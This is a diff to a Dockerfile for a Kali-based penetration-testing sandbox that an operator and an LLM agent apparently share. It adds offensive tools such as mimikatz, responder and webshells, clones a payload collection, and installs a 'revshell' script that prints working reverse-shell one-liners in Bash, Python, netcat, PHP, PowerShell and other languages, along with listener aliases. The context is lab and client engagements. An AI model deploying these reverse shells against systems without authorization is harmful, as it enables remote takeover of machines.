@@ -49,6 +49,7 @@ RUN go install github.com/PentestPad/subzy@latest
 RUN CGO_ENABLED=1 go install github.com/BishopFox/jsluice/cmd/jsluice@latest
 RUN go install github.com/hahwul/dalfox/v2@latest
 RUN go install github.com/lc/gau/v2/cmd/gau@latest
+RUN go install github.com/jpillora/chisel@latest
 
 FROM kalilinux/kali-rolling:latest
 
@@ -66,68 +67,154 @@ ENV DEBIAN_FRONTEND=noninteractive
 # inside the sandbox itself.
 RUN apt-get update && \
     apt-get install -y --no-install-recommends \
+      7zip \
       amass \
       arjun \
+      bat \
+      bind9-host \
       binutils \
       binwalk \
+      bloodhound.py \
+      bsdextrautils \
+      burpsuite \
+      bzip2 \
       ca-certificates \
+      certipy-ad \
+      cewl \
       checksec \
       chromium \
+      coercer \
+      commix \
       crunch \
       curl \
+      dbus-x11 \
       dirb \
+      dirsearch \
       dnsenum \
+      dnsrecon \
       dnsutils \
+      dos2unix \
       enum4linux \
+      evil-winrm \
+      exploitdb \
+      fd-find \
+      feroxbuster \
       ffuf \
       file \
+      firefox-esr \
+      fping \
+      fzf \
       gdb \
       git \
+      gitleaks \
       gobuster \
+      hashcat \
+      hping3 \
       hydra \
-      iptables \
+      imagemagick \
+      impacket-scripts \
+      ipcalc \
       iproute2 \
+      iptables \
+      iputils-ping \
       jq \
+      john \
+      less \
       libcap2-bin \
+      ligolo-ng \
       ltrace \
+      masscan \
       medusa \
+      mimikatz \
+      mtr-tiny \
+      nano \
+      nbtscan \
+      net-tools \
       netcat-openbsd \
+      netexec \
       nftables \
       nikto \
       nmap \
+      novnc \
       nuclei \
       onesixtyone \
+      openssh-client \
       patchelf \
+      peass \
+      penelope \
+      powersploit \
+      procps \
+      proxychains4 \
+      python3-pwntools \
+      python3-scapy \
       radare2 \
+      responder \
+      ripgrep \
+      rlwrap \
+      rsync \
+      seclists \
       smbclient \
+      smbmap \
       snmp \
       socat \
       sqlmap \
+      sshpass \
+      sslscan \
       strace \
       subfinder \
       tcpdump \
+      telnet \
+      testssl.sh \
       theharvester \
+      thunar \
+      tigervnc-common \
+      tigervnc-standalone-server \
       tmux \
+      traceroute \
+      tree \
+      tshark \
+      unzip \
+      vim-tiny \
       wafw00f \
+      webshells \
+      websockify \
+      wfuzz \
       wget \
       whatweb \
+      whois \
+      wireshark \
+      wordlists \
       wpscan \
-      ripgrep \
+      x11-xserver-utils \
       xfce4 \
       xfce4-terminal \
-      thunar \
-      dbus-x11 \
-      tigervnc-standalone-server \
-      tigervnc-common \
-      novnc \
-      websockify \
-      firefox-esr \
-      wireshark \
-      x11-xserver-utils \
-      burpsuite \
-      imagemagick && \
+      xz-utils \
+      # Lab VPN connectivity: HackTheBox, TryHackMe, Proving Grounds, and client
+      # lab engagements all deliver a .ovpn file — openvpn consumes it directly.
+      # Operator or agent runs `openvpn --config lab.ovpn` in a tmux term_run
+      # call (wait=false); tun0 then appears as the reachable tunnel interface.
+      openvpn \
+      # Native Kerberos ticket management for AD engagements (Pass-the-Ticket,
+      # PKINIT, Kerberoasting/AS-REP Roasting, certipy, impacket, netexec).
+      # kinit/klist/kdestroy from this package let the agent acquire and inspect
+      # TGTs without shimming through Python wrappers.
+      krb5-user && \
       if [ -f /usr/lib/nmap/nmap ]; then setcap cap_net_admin,cap_net_raw=eip /usr/lib/nmap/nmap; fi && \
-      for tool in nmap curl ffuf gobuster nikto whatweb grep rg git tmux Xtigervnc websockify xfce4-session convert r2 radare2 gdb checksec binwalk strace ltrace file strings objdump readelf dig chromium; do command -v "$tool" >/dev/null; done && \
+      if [ -f /usr/bin/masscan ]; then setcap cap_net_admin,cap_net_raw=eip /usr/bin/masscan; fi && \
+      if [ -f /usr/bin/ping ]; then setcap cap_net_raw=eip /usr/bin/ping && chmod 4755 /usr/bin/ping; fi && \
+      if [ -f /usr/sbin/hping3 ]; then setcap cap_net_admin,cap_net_raw=eip /usr/sbin/hping3; fi && \
+      if [ -f /usr/bin/fping ]; then setcap cap_net_raw=eip /usr/bin/fping && chmod 4755 /usr/bin/fping; fi && \
+      if [ -f /usr/bin/dumpcap ]; then setcap cap_net_admin,cap_net_raw=eip /usr/bin/dumpcap && chmod 4755 /usr/bin/dumpcap; fi && \
+      if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then gzip -d -k /usr/share/wordlists/rockyou.txt.gz; fi && \
+      (command -v testssl.sh >/dev/null && ln -sf "$(command -v testssl.sh)" /usr/local/bin/testssl || true) && \
+      (command -v hping3 >/dev/null && [ ! -f /usr/local/bin/hping3 ] && ln -sf "$(command -v hping3)" /usr/local/bin/hping3 || true) && \
+      (command -v responder >/dev/null && [ ! -f /usr/local/bin/responder ] && ln -sf "$(command -v responder)" /usr/local/bin/responder || true) && \
+      (command -v john >/dev/null && [ ! -f /usr/local/bin/john ] && ln -sf "$(command -v john)" /usr/local/bin/john || true) && \
+      (command -v 7zz >/dev/null && [ ! -f /usr/local/bin/7z ] && ln -sf "$(command -v 7zz)" /usr/local/bin/7z || true) && \
+      (command -v batcat >/dev/null && [ ! -f /usr/local/bin/bat ] && ln -sf "$(command -v batcat)" /usr/local/bin/bat || true) && \
+      (command -v fdfind >/dev/null && [ ! -f /usr/local/bin/fd ] && ln -sf "$(command -v fdfind)" /usr/local/bin/fd || true) && \
+      (command -v /usr/share/peass/linpeas/linpeas.sh >/dev/null && ln -sf /usr/share/peass/linpeas/linpeas.sh /usr/local/bin/linpeas && ln -sf /usr/share/peass/linpeas/linpeas.sh /usr/local/bin/linpeas.sh || true) && \
+      for tool in nmap curl ffuf gobuster nikto whatweb grep rg git tmux Xtigervnc websockify xfce4-session convert r2 radare2 gdb checksec binwalk strace ltrace file strings objdump readelf dig chromium feroxbuster commix masscan whois sslscan dnsrecon gitleaks ping hping3 fping searchsploit smbmap john hashcat wfuzz cewl ps less nano 7z unzip tree rsync dirsearch evil-winrm certipy coercer bat fzf traceroute mtr nxc netexec rlwrap penelope openvpn kinit; do command -v "$tool" >/dev/null || { echo "tool missing: $tool" >&2; exit 1; }; done && \
       rm -rf /var/lib/apt/lists/*
 
 # GitHub-sourced Python pentest tools with no Kali apt package: jwt_tool,
@@ -158,6 +245,64 @@ RUN apt-get update && apt-get install -y --no-install-recommends python3-pip && 
     chmod +x /usr/local/bin/jwt_tool /usr/local/bin/cloud_enum /usr/local/bin/graphql-cop /usr/local/bin/corsy && \
     for tool in jwt_tool cloud_enum graphql-cop corsy; do command -v "$tool" >/dev/null || { echo "git-sourced tool missing: $tool" >&2; exit 1; }; done
 
+# PayloadsAllTheThings: curated collection of payloads and bypasses for Web, API,
+# Network, and PrivEsc engagements. Cloned into /opt and symlinked into user home.
+RUN git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git /opt/PayloadsAllTheThings
+
+# revshell — lightweight reverse shell payload generator.
+# Usage: revshell [PORT]  (defaults to 4444)
+# IP auto-detection order: tun0 (VPN) → eth0 → any first non-loopback iface.
+# Prints copy-paste payloads for Bash, Python3, Netcat, Socat, PHP, PowerShell,
+# Perl, Ruby, and curl-downloaded meterpreter stager — one command, zero web lookup.
+RUN cat << 'REVSHELL_EOF' > /usr/local/bin/revshell
+#!/usr/bin/env bash
+# revshell — Yummi reverse shell payload generator
+# Usage: revshell [PORT]   (IP auto-detected from tun0/eth0/first-iface)
+
+PORT="${1:-4444}"
+
+# Prefer tun0 (VPN), fall back to eth0, then first non-loopback interface
+get_ip() {
+  local iface
+  for iface in tun0 eth0; do
+    ip -4 addr show "$iface" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1 | grep -q . && \
+      ip -4 addr show "$iface" | awk '/inet /{print $2}' | cut -d/ -f1 | head -1 && return
+  done
+  ip -4 addr | awk '/inet /{print $2}' | cut -d/ -f1 | grep -v '^127\.' | head -1
+}
+
+IP=$(get_ip)
+if [ -z "$IP" ]; then
+  echo "[!] Could not detect a local IP — set manually: revshell <PORT> (and edit the LHOST below)"
+  IP="LHOST"
+fi
+
+BOLD='\033[1m'; CYAN='\033[0;36m'; YELLOW='\033[0;33m'; GREEN='\033[0;32m'; RESET='\033[0m'
+echo -e "${BOLD}${CYAN}⚡ Yummi Reverse Shell Generator${RESET}"
+echo -e "   LHOST: ${GREEN}${IP}${RESET}   LPORT: ${GREEN}${PORT}${RESET}"
+echo -e "   VPN interface: $(ip link show tun0 2>/dev/null | grep -q UP && echo 'tun0 ✓' || echo 'not up')\n"
+
+show() { echo -e "${YELLOW}[$1]${RESET}\n${2}\n"; }
+
+show "Bash TCP" "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1"
+show "Bash TCP (encoded)" "bash -c '{echo,$(echo "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1" | base64 -w0)}|{base64,-d}|bash'"
+show "Python3" "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+show "Netcat (OpenBSD)" "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f"
+show "Netcat (traditional)" "nc -e /bin/sh ${IP} ${PORT}"
+show "Socat" "socat TCP:${IP}:${PORT} EXEC:/bin/sh"
+show "Socat (TTY upgrade)" "socat TCP:${IP}:${PORT} EXEC:'/bin/bash -li',pty,stderr,sigint,sane"
+show "PHP" "php -r '\$s=fsockopen(\"${IP}\",${PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+show "Perl" "perl -e 'use Socket;\$i=\"${IP}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+show "Ruby" "ruby -rsocket -e'f=TCPSocket.open(\"${IP}\",${PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+show "PowerShell" "\$c=New-Object System.Net.Sockets.TCPClient('${IP}',${PORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};\$e=New-Object System.Text.ASCIIEncoding;while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=\$e.GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+\"PS \"+(pwd).Path+\"> \";\$x=\$e.GetBytes(\$sb2);\$s.Write(\$x,0,\$x.Length);\$s.Flush()};\$c.Close()"
+
+echo -e "${BOLD}${CYAN}── Listener starters ──────────────────────────────────────${RESET}"
+echo -e "  ${YELLOW}rlnc ${PORT}${RESET}               # rlwrap nc (readline history)"
+echo -e "  ${YELLOW}penelope -p ${PORT}${RESET}         # penelope (auto-upgrade to PTY)"
+echo -e "  ${YELLOW}socat -d -d TCP-LISTEN:${PORT},reuseaddr,fork EXEC:'/bin/bash -li',pty,stderr,sigint,sane${RESET}"
+REVSHELL_EOF
+RUN chmod 0755 /usr/local/bin/revshell
+
 RUN groupadd --gid 1000 pentester && \
     useradd --uid 1000 --gid pentester --create-home --shell /bin/bash pentester && \
     # wireshark's dumpcap needs this group to capture without full root —
@@ -168,6 +313,175 @@ RUN groupadd --gid 1000 pentester && \
     # via `sudo`-less docker exec's own privilege if this doesn't apply, so
     # this must not fail the whole image build over it.
     (usermod -aG wireshark pentester || true)
+
+# Enhanced bash configuration with colors, multi-session history sync, pentest aliases, and fzf integration
+RUN cat << 'EOF' >> /home/pentester/.bashrc
+
+# Yummi Pentest Workbench Environment
+export PS1='\[\033[01;31m\]┌──(\[\033[01;36m\]pentester㉿yummi\[\033[01;31m\])-[\[\033[01;37m\]\w\[\033[01;31m\]]\n\[\033[01;31m\]└─\[\033[01;36m\]\$\[\033[00m\] '
+
+# Multi-session command history preservation & immediate sync across terminals
+HISTSIZE=100000
+HISTFILESIZE=100000
+shopt -s histappend
+PROMPT_COMMAND="history -a; history -n; ${PROMPT_COMMAND:-}"
+
+# Core aliases
+alias ll='ls -la --color=auto'
+alias la='ls -A --color=auto'
+alias l='ls -CF --color=auto'
+alias grep='grep --color=auto'
+alias bat='batcat'
+alias fd='fdfind'
+
+# Pentest recon & networking
+alias myip='ip -br -c a'
+alias ports='ss -tulpn'
+alias nmap-fast='nmap -T4 -v --open'
+alias linpeas='linpeas.sh'
+
+# Reverse shell & listener helpers
+alias rlnc='rlwrap nc -lvnp'
+alias rlsocat='rlwrap socat file:`tty`,raw,echo=0'
+alias pen='penelope'
+alias serve='python3 -m http.server 8000'
+alias serve-workspace='python3 -m http.server 8000 --directory /home/pentester/workspace'
+alias serve-payloads='python3 -m http.server 8000 --directory /home/pentester/payloadsallthethings'
+
+# Quick directory jumps
+alias seclists='cd /home/pentester/seclists'
+alias wordlists='cd /home/pentester/wordlists_system'
+alias payloads='cd /home/pentester/payloadsallthethings'
+alias privesc='cd /home/pentester/privesc_peass'
+alias windows='cd /home/pentester/windows_resources'
+alias workspace='cd /home/pentester/workspace'
+
+# Wordlist shortcut variables — save token budget for the agent and prevent
+# typos when typing long paths. Both operator and LLM use these directly:
+#   ffuf -u http://target/FUZZ -w $COMMON_TXT
+#   john --wordlist=$ROCKYOU hash.txt
+#   hydra -L $USERNAMES -P $ROCKYOU ssh://target
+export ROCKYOU='/usr/share/wordlists/rockyou.txt'
+export COMMON_TXT='/usr/share/seclists/Discovery/Web-Content/common.txt'
+export BIG_TXT='/usr/share/seclists/Discovery/Web-Content/big.txt'
+export MEDIUM_TXT='/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'
+export USERNAMES='/usr/share/seclists/Usernames/top-usernames-shortlist.txt'
+export PASSWORDS_TOP='/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt'
+
+# Fast fuzzy shell search (fzf) with Yummi styling
+export FZF_DEFAULT_COMMAND='fdfind --type f --strip-cwd-prefix --hidden --follow --exclude .git 2>/dev/null || find . -type f'
+export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
+export FZF_ALT_C_COMMAND='fdfind --type d --strip-cwd-prefix --hidden --follow --exclude .git 2>/dev/null || find . -type d'
+export FZF_DEFAULT_OPTS='--height 40% --layout=reverse --border --color=dark,bg+:#1e293b,fg+:#38bdf8,hl:#38bdf8,hl+:#38bdf8,pointer:#38bdf8,prompt:#38bdf8,info:#6b7a80'
+
+# Enable fzf bash completion and keybindings (Ctrl+R, Ctrl+T, Alt+C)
+if command -v fzf >/dev/null 2>&1; then
+  eval "$(fzf --bash 2>/dev/null)" || {
+    [ -f /usr/share/doc/fzf/examples/key-bindings.bash ] && . /usr/share/doc/fzf/examples/key-bindings.bash
+    [ -f /usr/share/doc/fzf/examples/completion.bash ] && . /usr/share/doc/fzf/examples/completion.bash
+  } 2>/dev/null || true
+fi
+EOF
+RUN cp /home/pentester/.bashrc /etc/skel/.bashrc
+
+# Ergonomic tmux configuration for the operator's interactive Bash tab
+RUN cat << 'EOF' > /home/pentester/.tmux.conf
+# Yummi Pentest Terminal Environment
+set -g default-terminal "screen-256color"
+set -g history-limit 50000
+set -g mouse on
+setw -g mode-keys vi
+set -s escape-time 0
+set -g base-index 1
+setw -g pane-base-index 1
+
+# Vi copy mode bindings
+bind-key -T copy-mode-vi v send-keys -X begin-selection
+bind-key -T copy-mode-vi y send-keys -X copy-pipe-and-cancel
+bind-key -T copy-mode-vi MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel
+
+# Yummi Cyan / Dark theme (#0a0c0e / #38bdf8)
+set -g status-style "bg=#0a0c0e,fg=#38bdf8"
+set -g status-left "#[fg=#38bdf8,bold] ⚡ YUMMI [#S] #[default]"
+set -g status-right "#[fg=#6b7a80]%H:%M %d-%b#[default] "
+set -g window-status-current-style "bg=#38bdf8,fg=#0a0c0e,bold"
+set -g pane-border-style "fg=#1e293b"
+set -g pane-active-border-style "fg=#38bdf8"
+EOF
+RUN cp /home/pentester/.tmux.conf /etc/tmux.conf && \
+    chown pentester:pentester /home/pentester/.tmux.conf
+
+# Editor ergonomics (vim & nano syntax and indentation)
+RUN printf "syntax on\nset number\nset mouse=\nset tabstop=4\nset shiftwidth=4\nset expandtab\nset autoindent\n" > /home/pentester/.vimrc && \
+    printf "set tabstospaces\nset tabsize 4\n" > /home/pentester/.nanorc && \
+    chown pentester:pentester /home/pentester/.vimrc /home/pentester/.nanorc
+
+# Pre-packaged desktop launchers for noVNC / XFCE
+RUN mkdir -p /usr/share/yummi/desktop && \
+    ( [ -f /usr/share/applications/firefox-esr.desktop ] && cp /usr/share/applications/firefox-esr.desktop /usr/share/yummi/desktop/ || cat << 'EOF' > /usr/share/yummi/desktop/firefox-esr.desktop
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=Firefox ESR
+Comment=Browse the Web & Security Testing
+Exec=firefox-esr %u
+Icon=firefox-esr
+Terminal=false
+Categories=Network;WebBrowser;Security;
+EOF
+) && \
+    ( [ -f /usr/share/applications/burpsuite.desktop ] && cp /usr/share/applications/burpsuite.desktop /usr/share/yummi/desktop/ || [ -f /usr/share/applications/kali-burpsuite.desktop ] && cp /usr/share/applications/kali-burpsuite.desktop /usr/share/yummi/desktop/burpsuite.desktop || cat << 'EOF' > /usr/share/yummi/desktop/burpsuite.desktop
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=Burp Suite
+Comment=Web Application Security Testing & Proxy
+Exec=burpsuite
+Icon=burpsuite
+Terminal=false
+Categories=Network;Security;
+EOF
+) && \
+    ( [ -f /usr/share/applications/wireshark.desktop ] && cp /usr/share/applications/wireshark.desktop /usr/share/yummi/desktop/ || [ -f /usr/share/applications/kali-wireshark.desktop ] && cp /usr/share/applications/kali-wireshark.desktop /usr/share/yummi/desktop/wireshark.desktop || cat << 'EOF' > /usr/share/yummi/desktop/wireshark.desktop
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=Wireshark
+Comment=Network Traffic Analyzer
+Exec=wireshark %f
+Icon=wireshark
+Terminal=false
+Categories=Network;Security;
+EOF
+) && \
+    ( [ -f /usr/share/applications/xfce4-terminal.desktop ] && cp /usr/share/applications/xfce4-terminal.desktop /usr/share/yummi/desktop/ || cat << 'EOF' > /usr/share/yummi/desktop/xfce4-terminal.desktop
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=Terminal
+Comment=Access the command line
+Exec=xfce4-terminal
+Icon=utilities-terminal
+Terminal=false
+Categories=System;TerminalEmulator;
+EOF
+) && \
+    ( [ -f /usr/share/applications/thunar.desktop ] && cp /usr/share/applications/thunar.desktop /usr/share/yummi/desktop/ || cat << 'EOF' > /usr/share/yummi/desktop/thunar.desktop
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=File Manager
+Comment=Manage files and folders
+Exec=thunar %U
+Icon=org.xfce.thunar
+Terminal=false
+Categories=System;FileManager;
+EOF
+) && \
+    chmod +x /usr/share/yummi/desktop/*.desktop && \
+    mkdir -p /home/pentester/Desktop && \
+    cp -f /usr/share/yummi/desktop/*.desktop /home/pentester/Desktop/ && \
+    chown -R pentester:pentester /home/pentester/Desktop
 
 # nuclei ships with ZERO templates from Kali's apt package — without this,
 # every nuclei invocation (vuln-scanning skill, api-pentest's -tags graphql)
@@ -203,11 +517,11 @@ COPY --from=mcpbuilder /out/yummi-sandbox-mcp /usr/local/bin/yummi-sandbox-mcp
 RUN chmod 0755 /usr/local/bin/yummi-sandbox-mcp
 
 # Modern recon/web binaries (see the recontools stage) —
-# httpx/dnsx/alterx/katana/dalfox/gau/naabu/tlsx/subzy/jsluice. Verify they landed and are runnable, so
+# httpx/dnsx/alterx/katana/dalfox/gau/naabu/tlsx/subzy/jsluice/chisel. Verify they landed and are runnable, so
 # a broken install fails the build rather than surfacing as a mysterious
 # "command not found" mid-engagement.
 COPY --from=recontools /out/ /usr/local/bin/
-RUN for tool in httpx dnsx alterx gau katana dalfox naabu tlsx subzy jsluice; do command -v "$tool" >/dev/null || { echo "recon tool missing: $tool" >&2; exit 1; }; done
+RUN for tool in httpx dnsx alterx gau katana dalfox naabu tlsx subzy jsluice chisel; do command -v "$tool" >/dev/null || { echo "recon tool missing: $tool" >&2; exit 1; }; done
 
 # Pentest commands from orchestrator run as UID 1000 via docker exec --user;
 # the operator's Bash tab attaches a tmux session as the same user. The
